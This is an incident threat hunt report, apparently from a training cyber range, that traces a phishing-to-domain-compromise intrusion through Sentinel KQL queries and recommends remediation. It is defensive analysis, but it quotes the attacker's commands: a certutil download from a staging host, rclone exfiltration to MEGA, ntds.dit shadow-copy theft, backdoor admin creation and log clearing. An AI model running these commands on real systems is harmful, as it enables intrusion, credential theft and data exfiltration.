# EmberForge: Source Leak - Threat Hunt Report

**Analyst:** Symone-Marie Priester
**Date:** January 31, 2026
**Platform:** Microsoft Sentinel
**Workspace:** LAW-Cyber-Range
**Log Table:** EmberForgeX_CL
**Investigation Window:** 2026-01-30 21:00 UTC - 2026-01-31 00:00 UTC
**Classification:** Confidential - Internal Use Only

---

## Executive Summary

On January 30, 2026, the Security Operations team received an escalation from the CISO regarding a suspected breach of EmberForge Studios, a game development subsidiary. I was tasked with conducting a full-scope threat hunt across the EmberForge environment to determine the extent of the compromise, identify what data was accessed or exfiltrated, trace the attacker's movement through the network, and assess whether persistence mechanisms were established that could allow re-entry after remediation.

The investigation was conducted in Microsoft Sentinel using Sysmon and Windows Security event telemetry ingested into a custom log table. Three hosts were in scope across the emberforge.local domain:

| Host | Role |
|------|------|
| EC2AMAZ-B9GHHO6 | Workstation (Lisa Martin - Game Developer) |
| EC2AMAZ-16V3AU4 | Application Server |
| EC2AMAZ-EEU3IA2 | Domain Controller |

**Key Findings at a Glance:**
- Proprietary game development source code was exfiltrated to an attacker-controlled MEGA cloud account
- The attacker achieved full domain compromise, extracting the Active Directory credential database (ntds.dit)
- Multiple persistence mechanisms were deployed across all three hosts including scheduled tasks, a backdoor domain admin account, and AnyDesk remote access
- The initial compromise vector was a targeted phishing delivery: a malicious DLL packaged inside a fake project review archive sent to a developer
- The attacker made several critical OPSEC mistakes, exposing credentials in plaintext command-line arguments that provide strong attribution leads

---

## Section 01 - Impact Assessment: What Was Stolen?

### Finding 1 - Target Directory

**CISO Directive:** *"Before I care about how they got in, I need to know what they took and where it went. Legal needs the scope for breach notification."*

**Approach:** The attacker needed to package data before exfiltrating it. I started broad by filtering out known-good noise (Splunk, Edge, svchost) to surface suspicious commands, then narrowed down to compression-related keywords.

![Q01 - Noise filtering results](images/q01_noise_filter.png)

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("Compress", "zip", "rar", "7z", "tar", "makecab", "rclone")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

![Q01 - Compression and rclone results](images/q01_compression_results.png)

**Finding:** The attacker used PowerShell's `Compress-Archive` cmdlet on EC2AMAZ-16V3AU4:
```
powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
```

Then used `rclone` to upload the archive to a MEGA cloud storage bucket.

**Result:** `C:\GameDev`

### Finding 2 - Exfil Destination

**Approach:** The rclone commands from Finding 1 already revealed the destination. The rclone config echoed to `rclone.conf` showed `type = mega`, and the copy command targeted `mega:exfil`.

**Result:** `Mega`

### Finding 3 - Attacker Attribution

**Approach:** Attackers sometimes pass credentials directly on the command line instead of using config files - a major OPSEC mistake. Searching all rclone executions revealed one that exposed everything:
```
rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

**Result:** `jwilson.vhr@proton.me`

### Finding 4 - Domain Compromise Evidence

**Approach:** Volume shadow copy is the standard technique for stealing Active Directory's credential database since the file is locked while AD is running. I searched for vssadmin and ntds-related activity on the DC.

```kql
EmberForgeX_CL
| where Computer has "EEU3IA2"
| where CommandLine_s has_any ("ntds", "vssadmin", "shadow", "ntdsutil", "esentutl")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** The attacker created a shadow copy and extracted ntds.dit:
```
cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

**Result:** `ntds.dit`

---

## Section 02 - Exfiltration Analysis

### Finding 5 - Exfiltration Tool

**Goal:** Identify the cloud synchronization tool used for data exfiltration.

**Approach:** Already identified from Finding 1 - rclone is a legitimate cloud sync tool commonly abused by threat actors for exfiltration because it supports many cloud providers and can be configured silently.

**Result:** `rclone.exe`

### Finding 6 - Exfiltration Destination IP

**Goal:** Find the IP address that received the stolen data by correlating rclone's network connections.

**Approach:** Sysmon EventCode 3 logs every outbound network connection a process makes. By filtering for rclone in EventCode 3 events, I can see exactly where the data went.

```kql
EmberForgeX_CL
| where EventCode_s == "3"
| where CommandLine_s has "rclone" or EventData_Xml_s has "rclone"
| project TimeGenerated, Computer, EventData_Xml_s
```

**Finding:** The EventData XML revealed `DestinationIp: 66.203.125.15` connecting to `bt5.api.mega.co.nz` on port 443.

![Q06 - Rclone network connection results](images/q06_rclone_network.png)

**Result:** `66.203.125.15`

### Finding 7 - Attacker Credential Exposure

**Goal:** Find the plaintext password exposed in rclone command lines.

**Approach:** Comparing all rclone executions side by side, most used `--config C:\Users\Public\rclone.conf`, but one passed `--mega-pass` directly on the command line.

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

![Q07 - Rclone executions comparison](images/q07_rclone_creds.png)

**Result:** `Summer2024!`

### Finding 8 - Archive Method

**Goal:** Identify the PowerShell cmdlet used to create the archive.

**Approach:** Already found in Finding 1. The attacker used a built-in OS capability (Living Off the Land) rather than third-party tools.

![Q08 - Compress-Archive visible in Finding 1 results](images/q01_noise_filter.png)

**Result:** `Compress-Archive`

---

## Section 03 - Initial Access Investigation

### Finding 9 - Attacker Staging Infrastructure

**Goal:** Find the attacker's external infrastructure used to host tools.

**Approach:** Attackers download tools from infrastructure they control. I searched for common LOLBin download utilities referencing external URLs.

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("http", "certutil", "wget", "curl", "bitsadmin", "Invoke-WebRequest")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** Multiple `certutil` commands across hosts downloading from the same server:
```
certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
```

![Q09 - Certutil download commands](images/q09_certutil.png)

**Result:** `sync.cloud-endpoint.net`

### Finding 10 - Initial Payload

**Goal:** Find the first malicious file executed on the workstation.

**Approach:** Lisa opened something from her desktop that kicked off the infection. I searched for LOLBin utilities (rundll32, mshta, cscript, etc.) in Lisa's process history on B9GHHO6.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "1"
| where EventData_Xml_s has_any ("rundll32", "review.dll")
| project TimeGenerated, EventData_Xml_s
| sort by TimeGenerated asc
```

**Finding:** `rundll32.exe` was used to load a malicious DLL from a mounted drive:

![Q10 - Lisa's process activity](images/q10_lisa_activity.png)
```
"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
```

**Result:** `review.dll`

### Finding 11 - Delivery Vector

**Goal:** Identify the drive letter where the malicious file was loaded from.

**Approach:** The `D:\` path is significant because it's not the system drive. Mounted disk images (ISO, VHD) appear as virtual drives and bypass certain Windows security protections like Mark of the Web (MOTW), which means SmartScreen won't block files inside them.

**Result:** `D:`

### Finding 12 - Patient Zero

**Goal:** Identify patient zero.

**Approach:** The `Caller_User_Name_s` field in the rundll32 process creation event tells us who executed it.

**Result:** `lmartin`

### Finding 13 - Execution Chain

**Goal:** Trace the full process chain from user action to malicious file loading.

**Approach:** Using Sysmon EventCode 1 with `ParentImage` extraction to trace back from rundll32 to its parent.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "1"
| where EventData_Xml_s has "rundll32"
| where EventData_Xml_s has "review.dll"
| project TimeGenerated,
    ParentImage=extract("ParentImage'>(.*?)</Data>", 1, EventData_Xml_s),
    ParentCommandLine=extract("ParentCommandLine'>(.*?)</Data>", 1, EventData_Xml_s),
    Image=extract("Image'>(.*?)</Data>", 1, EventData_Xml_s),
    CommandLine=extract("CommandLine'>(.*?)</Data>", 1, EventData_Xml_s)
```

**Finding:** Lisa double-clicked something in Explorer, which launched rundll32 to load the DLL.

![Q13 - Process execution chain](images/q13_execution_chain.png)

**Result:** `explorer.exe > rundll32.exe > review.dll`

### Finding 14 - Delivery Unpacking

**Goal:** Find the extraction tool and destination folder before the DLL execution.

**Approach:** Lisa must have downloaded an archive and extracted it before opening the contents. I searched for archive extraction tools (7-Zip, WinRAR, etc.) in her process history.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "1"
| where EventData_Xml_s has_any ("expand", "extract", "7z", "winrar", "tar", "unzip", "WinZip", "bandizip", "peazip")
    or EventData_Xml_s has "lmartin"
| where EventData_Xml_s has_any ("Desktop", "Downloads", "AppData", "Users")
| project TimeGenerated,
    Image=extract("Image'>(.*?)</Data>", 1, EventData_Xml_s),
    CommandLine=extract("CommandLine'>(.*?)</Data>", 1, EventData_Xml_s),
    ParentImage=extract("ParentImage'>(.*?)</Data>", 1, EventData_Xml_s)
| sort by TimeGenerated asc
```

**Finding:** 7-Zip extracted the archive to Lisa's Downloads folder:

![Q14 - 7-Zip extraction activity](images/q14_7zip_extraction.png)
```
"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" -spe -an
```

**Result:** `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review`

---

## Section 04 - Workstation Compromise Analysis

### Finding 15 - Primary Malware

**Goal:** Identify the attacker's primary tool that appeared after initial DLL execution.

**Approach:** From the Finding 13 execution chain results, I could see `update.exe` in `C:\Users\Public` (a world-writable directory) being used as the parent process for reconnaissance commands, scheduled tasks, and UAC bypass activity. It was also downloaded via certutil from the staging server.

**Result:** `C:\Users\Public\update.exe`

### Finding 16 - Command and Control Domain

**Goal:** Find the command-and-control domain by examining DNS queries from the malware.

**Approach:** Sysmon EventCode 22 captures every DNS query a process makes. Filtering for update.exe's DNS activity reveals its C2 infrastructure.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "22"
| where EventData_Xml_s has "update.exe"
| project TimeGenerated,
    QueryName=extract("QueryName'>(.*?)</Data>", 1, EventData_Xml_s),
    Image=extract("Image'>(.*?)</Data>", 1, EventData_Xml_s)
| sort by TimeGenerated asc
```

**Finding:** The malware resolved `cdn.cloud-endpoint.net` - designed to blend in with legitimate cloud/CDN traffic.

![Q16 - DNS queries from update.exe](images/q16_dns_queries.png)

**Result:** `cdn.cloud-endpoint.net`

### Finding 17 - C2 IP Address

**Goal:** Find the IP address the C2 domain resolved to.

**Approach:** The `QueryResults` field in EventCode 22 raw XML contains the resolved IP addresses.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "22"
| where EventData_Xml_s has "cdn.cloud-endpoint.net"
| project TimeGenerated,
    QueryName=extract("QueryName'>(.*?)</Data>", 1, EventData_Xml_s),
    QueryResults=extract("QueryResults'>(.*?)</Data>", 1, EventData_Xml_s)
| take 1
```

![Q17 - DNS query results with resolved IP](images/q17_dns_resolved_ip.png)

**Result:** `104.21.30.237`

### Finding 18 - Process Injection

**Goal:** Trace process injection using CreateRemoteThread events.

**Approach:** Sysmon EventCode 8 captures CreateRemoteThread calls, which is a common technique for injecting code from one process into another.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "8"
| project TimeGenerated,
    SourceImage=extract("SourceImage'>(.*?)</Data>", 1, EventData_Xml_s),
    TargetImage=extract("TargetImage'>(.*?)</Data>", 1, EventData_Xml_s)
| sort by TimeGenerated asc
```

**Finding:** `rundll32.exe` injected into `notepad.exe` - a classic evasion technique to hide malicious code inside a benign process.

![Q18 - CreateRemoteThread injection events](images/q18_injection.png)

**Result:** `rundll32.exe > notepad.exe`

---

## Section 05 - Privilege Escalation Analysis

### Finding 19 - UAC Bypass Binary

**Goal:** Identify the Windows executable abused for UAC bypass.

**Approach:** From the Finding 13 execution chain, I saw `fodhelper.exe` being called after registry modifications. Fodhelper is a trusted Windows binary that auto-elevates without a UAC prompt, making it a well-known bypass target.

**Result:** `fodhelper.exe`

### Finding 20 - Registry Hijack Enabler

**Goal:** Find the registry value that enables the fodhelper UAC bypass.

**Approach:** The fodhelper bypass works by hijacking the `ms-settings` protocol handler. Two registry keys were set: one to point the default value to the payload, and one to enable the hijack by setting `DelegateExecute` to empty.

**Result:** `DelegateExecute`

### Finding 21 - SYSTEM-Level Process Migration

**Goal:** Trace the second injection after UAC bypass, identifying source, target, and security context.

**Approach:** After escalating via fodhelper, the elevated `update.exe` needed a stable foothold in a SYSTEM process. I queried EventCode 8 filtered to update.exe and extracted user context.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "8"
| where EventData_Xml_s has "update.exe"
| project TimeGenerated,
    SourceImage=extract("SourceImage'>(.*?)</Data>", 1, EventData_Xml_s),
    TargetImage=extract("TargetImage'>(.*?)</Data>", 1, EventData_Xml_s),
    SourceUser=extract("SourceUser'>(.*?)</Data>", 1, EventData_Xml_s),
    TargetUser=extract("TargetUser'>(.*?)</Data>", 1, EventData_Xml_s)
```

**Finding:** `update.exe` (EMBERFORGE\lmartin) injected into `spoolsv.exe` (NT AUTHORITY\SYSTEM), crossing security boundaries from user context to SYSTEM.

![Q21 - Stable injection with user context](images/q21_stable_injection.png)

**Result:** `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)`

### Finding 22 - Credential Dumping

**Goal:** Identify what process dumped LSASS memory.

**Approach:** No ProcessAccess (EventCode 10) events existed for LSASS, indicating direct syscalls were used to bypass API monitoring. I pivoted to file creation events (EventCode 11) to find what wrote the dump file.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "11"
| where EventData_Xml_s has_any ("lsass", "dump", ".dmp", "minidump", "procdump", "comsvcs")
| project TimeGenerated,
    Image=extract("Image'>(.*?)</Data>", 1, EventData_Xml_s),
    TargetFilename=extract("TargetFilename'>(.*?)</Data>", 1, EventData_Xml_s)
| sort by TimeGenerated asc
```

**Finding:** `update.exe` created `C:\Windows\System32\lsass.dmp`.

![Q22 - LSASS dump file creation](images/q22_lsass_dump.png)

**Result:** `update.exe`

### Finding 23 - Credential Dump Location

**Goal:** Find where the credential dump was written to disk.

**Approach:** Already visible from the Finding 22 query - the `TargetFilename` field showed the path.

**Result:** `C:\Windows\System32\lsass.dmp`

---

## Section 06 - Reconnaissance and Discovery

### Finding 24 - Domain User Enumeration

**Goal:** Find the first discovery command that queries all domain user accounts.

**Approach:** From the Finding 13 execution chain results, the attacker ran a sequence of reconnaissance commands after initial access. The first domain enumeration command was `net user /domain`.

**Result:** `net user /domain`

### Finding 25 - Privilege Group Enumeration

**Goal:** Identify the command used to find the highest-privilege group members.

**Approach:** Immediately after listing users, the attacker queried Domain Admins to identify who has the keys to the kingdom.

**Result:** `net group "Domain Admins" /domain`

### Finding 26 - Domain Controller Discovery

**Goal:** Find the command that locates critical infrastructure (Domain Controllers).

**Approach:** The attacker needed to know where the DC was before moving laterally. `nltest` with the `/dclist` flag is the standard way to enumerate domain controllers.

**Result:** `nltest /dclist:emberforge.local`

---

## Section 07 - Lateral Movement Analysis

### Finding 27 - Tool Staging Share

**Goal:** Find the network share created for tool distribution.

**Approach:** Before moving laterally, the attacker set up the workstation as a distribution point by creating a share accessible to everyone.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where CommandLine_s has_any ("net share", "New-SmbShare")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** A share named "tools" was created pointing to `C:\Users\Public` with full access.

![Q27 - Network share creation](images/q27_net_share.png)

**Result:** `net share tools=C:\Users\Public /grant:everyone,full`

### Finding 28 - Firewall Manipulation

**Goal:** Find the firewall rule name added to enable lateral movement.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where CommandLine_s has "firewall"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** An inbound allow rule was added for SMB on port 445:
```
netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445
```

![Q28 - Firewall rule addition](images/q28_firewall_rule.png)

**Result:** `SMB`

### Finding 29 - Post-Escalation Beacon Process

**Goal:** Identify the SYSTEM process that served as the parent for all lateral movement commands.

**Approach:** After the beacon migrated to a SYSTEM process, all subsequent attacker commands should share the same parent. I checked the parent process of the net share and firewall commands.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where EventCode_s == "1"
| where EventData_Xml_s has_any ("net share", "netsh", "firewall")
| project TimeGenerated,
    Image=extract("Image'>(.*?)</Data>", 1, EventData_Xml_s),
    CommandLine=extract("CommandLine'>(.*?)</Data>", 1, EventData_Xml_s),
    ParentImage=extract("ParentImage'>(.*?)</Data>", 1, EventData_Xml_s)
| sort by TimeGenerated asc
```

**Finding:** Both commands had `spoolsv.exe` as their parent - confirming this is where the beacon was running after the Finding 21 injection.

![Q29 - Parent process of lateral movement commands](images/q29_parent_process.png)

**Result:** `spoolsv.exe`

### Finding 30 - Beacon Distribution

**Goal:** Find the full command used to push the primary tool to the server via admin shares.

```kql
EmberForgeX_CL
| where Computer has "B9GHHO6"
| where CommandLine_s has_any ("copy", "xcopy", "robocopy", "move")
| where CommandLine_s has "C$"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** The attacker copied update.exe to the server at 10.1.57.66 via the C$ admin share.

![Q30 - Beacon copy via admin share](images/q30_beacon_copy.png)

**Result:** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe`

### Finding 31 - LOLBin Tool Staging on Server

**Goal:** Identify the utility and URL used to download tools on the server.

```kql
EmberForgeX_CL
| where Computer has "16V3AU4" or Computer has "EEU3IA2"
| where CommandLine_s has_any ("certutil", "bitsadmin", "Invoke-WebRequest", "wget", "curl")
| where CommandLine_s has "http"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Result:** `certutil.exe > http://sync.cloud-endpoint.net:8080/update.exe`

![Q31 - LOLBin downloads on server](images/q31_lolbin_downloads.png)

### Finding 32 - Remote Execution Evidence

**Goal:** Find the randomly-named service created by the remote execution technique.

**Approach:** Tools like Impacket's smbexec/wmiexec create temporary Windows services with random names. EventCode 7045 captures new service installations.

```kql
EmberForgeX_CL
| where Computer has_any ("16V3AU4", "EEU3IA2")
| where EventCode_s == "7045"
| project TimeGenerated, Computer,
    ServiceName=extract("ServiceName'>(.*?)</Data>", 1, Raw_s)
| where ServiceName !contains "Splunk"
| sort by TimeGenerated asc
```

![Q32 - Raw service installation events (truncated)](images/q32_raw_services.png)

![Q32 - Extracted service names](images/q32_service_names.png)

**Finding:** Multiple random service names appeared. The first one on the target server (16V3AU4) was `pGJLIKnC`. Note: case sensitivity matters here - the `I` is a capital I, not lowercase L.

![Q32 - CSV confirmation of case-sensitive service name](images/q32_csv_confirmation.png)

**Result:** `pGJLIKnC`

### Finding 33 - Initial Server Reconnaissance

**Goal:** Identify the very first attacker command on the newly compromised server.

```kql
EmberForgeX_CL
| where Computer has "16V3AU4"
| where CommandLine_s has "__output"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Approach:** The `__output` pattern in temp file names is a signature of Impacket-style remote execution. The first deliberate attacker command on any new host is almost always `whoami` for situational awareness.

![Q33 - Remote execution commands on server](images/q33_remote_exec.png)

**Result:** `whoami`

### Finding 34 - Failed Lateral Movement Attempt

**Goal:** Identify the authentication protocol used in the attacker's failed lateral movement attempt.

```kql
EmberForgeX_CL
| where Computer has_any ("16V3AU4", "EEU3IA2")
| where EventCode_s == "4625"
| project TimeGenerated, Computer,
    LogonType=extract("LogonType'>(.*?)</Data>", 1, EventData_Xml_s),
    AuthPackage=extract("AuthenticationPackageName'>(.*?)</Data>", 1, EventData_Xml_s),
    SourceAddress=extract("IpAddress'>(.*?)</Data>", 1, EventData_Xml_s)
| sort by TimeGenerated asc
```

**Finding:** Repeated failed logon attempts from 10.1.173.145 using NTLM authentication with LogonType 3 (network logon). This suggests a pass-the-hash or brute force attempt that failed before the attacker found a working approach.

![Q34 - Failed logon events](images/q34_failed_logons.png)

**Result:** `NTLM`

---

## Section 08 - Domain Controller Compromise

### Finding 35 - DC Arrival and AD Database Extraction

**Goal:** Trace the first command on the DC and identify the extraction tool used for ntds.dit.

```kql
EmberForgeX_CL
| where Computer has "EEU3IA2"
| where CommandLine_s has "__output"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Approach:** The same remote execution pattern (with `__output` temp files) was used on the DC. The attacker ran `whoami` first, then immediately went after the AD database using `vssadmin` to create a volume shadow copy.

![Q35 - DC remote execution commands](images/q35_dc_commands.png)

**Result:** `whoami > vssadmin.exe`

### Finding 36 - Backdoor Account Creation

**Goal:** Find the backdoor account created on the DC.

```kql
EmberForgeX_CL
| where Computer has "EEU3IA2"
| where CommandLine_s has_any ("net user", "New-LocalUser", "New-ADUser")
| where CommandLine_s has "/add" or CommandLine_s has "add"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** `net user svc_backup P@ssw0rd123! /add /domain` - named to blend in with legitimate service accounts.

![Q36 - Backdoor account creation](images/q36_backdoor_account.png)

**Result:** `svc_backup`

### Finding 37 - Backdoor Account Credentials

**Goal:** Find the plaintext password set on the backdoor account.

**Approach:** The password was exposed directly in the `net user /add` command from Finding 36. Another OPSEC failure permanently captured in the logs.

**Result:** `P@ssw0rd123!`

### Finding 38 - Privilege Assignment

**Goal:** Identify the group the backdoor account was added to.

```kql
EmberForgeX_CL
| where Computer has "EEU3IA2"
| where CommandLine_s has "svc_backup"
| where CommandLine_s has "group"
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** `net group "Domain Admins" svc_backup /add /domain` - full domain admin privileges.

![Q38 - Domain Admins group addition](images/q38_domain_admins.png)

**Result:** `Domain Admins`

### Finding 39 - Exposed Domain Admin Credential

**Goal:** Find the plaintext password exposed in the network drive mapping command.

```kql
EmberForgeX_CL
| where Computer has "EEU3IA2"
| where CommandLine_s has_any ("net use", "New-PSDrive")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** `net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!` - the domain admin password in plain text on the command line.

![Q39 - Network drive mapping with exposed credentials](images/q39_net_use.png)

**Result:** `EmberForge2024!`

---

## Section 09 - Persistence Mechanisms

### Finding 40 - Scheduled Task Persistence

**Goal:** Find the persistence mechanism via scheduled tasks.

```kql
EmberForgeX_CL
| where CommandLine_s has "schtasks" and CommandLine_s has "/create"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** A scheduled task named "WindowsUpdate" was created across multiple hosts, set to run `C:\Users\Public\update.exe` on startup as SYSTEM. The name was chosen to look like a legitimate Windows process.

![Q40 - Scheduled task creation across hosts](images/q40_schtasks.png)

**Result:** `WindowsUpdate`

### Finding 41 - Remote Access Tool

**Goal:** Identify the legitimate remote management tool installed for persistence.

**Approach:** AnyDesk was silently installed across multiple hosts with the `--start-with-win --silent` flags, giving the attacker a backup access method independent of their primary malware.

**Result:** `AnyDesk`

### Finding 42 - Remote Access Configuration

**Goal:** Find the configuration file that was read and modified for AnyDesk.

```kql
EmberForgeX_CL
| where CommandLine_s has "AnyDesk"
| where CommandLine_s has_any ("type", "cat", "get-content", "conf", "config")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** The attacker read the config with `type`, then wrote an unattended access password hash to it using `echo` commands, enabling passwordless remote access.

![Q42 - AnyDesk config read and modification](images/q42_anydesk_config.png)

**Result:** `C:\ProgramData\AnyDesk\system.conf`

---

## Section 10 - Anti-Forensics and Evidence Destruction

### Finding 43 - Log Clearing Tool

**Goal:** Identify the tool used to clear event logs on the DC.

```kql
EmberForgeX_CL
| where Computer has "EEU3IA2"
| where CommandLine_s has_any ("wevtutil", "Clear-EventLog", "1102")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Finding:** `wevtutil cl Security` and `wevtutil cl System` were executed on the DC.

![Q43 - Event log clearing commands](images/q43_wevtutil.png)

**Result:** `wevtutil`

### Finding 44 - Cleared Event Logs

**Goal:** Identify which event logs were cleared.

**Approach:** The Q43 query showed two separate `wevtutil cl` commands targeting the Security and System logs. Sysmon data (which logs to a separate channel) was not cleared, which is why we were able to reconstruct the entire attack chain.

**Result:** `Security, System`

---

## Attack Timeline Summary

| Time (UTC) | Host | Action |
|---|---|---|
| 10:35 PM | B9GHHO6 | Lisa extracts archive with 7-Zip, opens review.dll via rundll32 |
| 10:36 PM | EEU3IA2 | Attacker clears Security and System logs on DC |
| 10:36 PM | EEU3IA2 | Scheduled task "WindowsUpdate" created on DC |
| 10:37 PM | EEU3IA2 | vssadmin shadow copy + ntds.dit extraction, backdoor account created |
| 10:38 PM | 16V3AU4 | rclone config set up, GameDev directory compressed and exfiltrated to MEGA |
| 10:39 PM | B9GHHO6 | SMB firewall rule added, tools share created, AnyDesk installed |
| 10:41 PM | 16V3AU4 | Remote execution via random services, certutil downloads, AnyDesk installed |
| 10:42 PM | B9GHHO6 | update.exe injected into spoolsv.exe (SYSTEM), LSASS dumped |
| 10:43 PM | B9GHHO6 | UAC bypass via fodhelper, rundll32 injected into notepad.exe, recon commands |

## Key IOCs

| Type | Value |
|---|---|
| C2 Domain | cdn.cloud-endpoint.net |
| C2 IP | 104.21.30.237 |
| Staging Server | sync.cloud-endpoint.net:8080 |
| Exfil Destination | mega.nz (66.203.125.15) |
| Attacker Email | jwilson.vhr@proton.me |
| Malware | C:\Users\Public\update.exe |
| Initial Payload | D:\review.dll |
| Backdoor Account | svc_backup / P@ssw0rd123! |
| Exposed Credential | EMBERFORGE\Administrator / EmberForge2024! |
| Remote Access | AnyDesk (silently installed) |
| Persistence | Scheduled task "WindowsUpdate" |

## Recommendations for Remediation

Based on the findings above, I recommend the following immediate and short-term actions. These have been prioritized by urgency:

**Immediate (within 24 hours):**
1. **Reset all domain credentials**, especially the Administrator account and all Domain Admins members. The attacker has ntds.dit, meaning every credential in the domain should be considered compromised.
2. **Disable and remove** the `svc_backup` backdoor account.
3. **Rotate the KRBTGT password twice** to invalidate any potential golden tickets the attacker may have created from the stolen ntds.dit.
4. **Block** `cdn.cloud-endpoint.net`, `sync.cloud-endpoint.net`, and associated IPs (104.21.30.237, 66.203.125.15) at the perimeter firewall.

**Short-term (within 72 hours):**
5. **Uninstall AnyDesk** from all three hosts and block its network signatures at the perimeter.
6. **Remove** the "WindowsUpdate" scheduled task from all hosts.
7. **Rebuild** all three compromised hosts from clean images. Patching in-place is insufficient given the depth of compromise.
8. **Audit** all Domain Admins group membership and remove any unauthorized accounts.

**Ongoing hardening:**
9. **Implement** LSASS protection (PPL/Credential Guard) to prevent future credential dumping.
10. **Review** SMB access policies and disable unnecessary admin shares (C$).
11. **Deploy** application whitelisting to prevent unauthorized tools like rclone, AnyDesk, and certutil abuse.
12. **Enable** PowerShell script block logging and enhanced Sysmon coverage on all endpoints.

---

*This report was prepared by Symone-Marie Priester as part of an active incident response engagement. All findings are based on telemetry available in the Microsoft Sentinel workspace at the time of investigation. The Sysmon data that survived the attacker's log clearing was instrumental in reconstructing the full attack chain.*
